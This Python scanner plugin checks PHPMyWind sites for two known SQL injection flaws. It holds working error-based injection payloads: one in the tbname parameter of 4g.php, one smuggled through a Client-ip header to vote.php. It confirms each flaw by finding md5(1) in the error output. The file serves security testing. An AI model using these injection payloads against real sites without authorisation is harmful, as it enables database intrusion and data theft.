#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai

def assign(service, arg):
	if service == 'phpmywind':
		return True, arg

def audit(arg):
    #Refer=http://www.wooyun.org/bugs/wooyun-2010-089760
    payload = "4g.php?m=show&cid=2&tbname=pmw_infolist`%20SET%20hits=hits%20WHERE%201=2%20and%20@`'`%20AND%20extractvalue(1,concat(0x5c,md5(1)))%20--%20@`'`"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
        security_hole(target)
    #Refer=http://www.wooyun.org/bugs/wooyun-2010-081372
    payload = "vote.php?id=1"
    target = arg + payload
    raw = '''
POST xx HTTP/1.1
Host: xx
Connection: keep-alive
Content-Length: 35
Content-Type: application/x-www-form-urlencoded
Client-ip: 1.2.3.4\t' and  extractvalue(1,concat(0x5c,md5(1))) and '1'='1

options%5B%5D=1&voteid=1&action=add'''
    code, head, body, errcode, final_url = curl.curl2(target, raw=raw);
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
        security_hole(target)

if __name__ == '__main__':
	from dummy import *
	audit(assign('phpmywind', 'http://127.0.0.1/phpmywind_5.2/')[1])                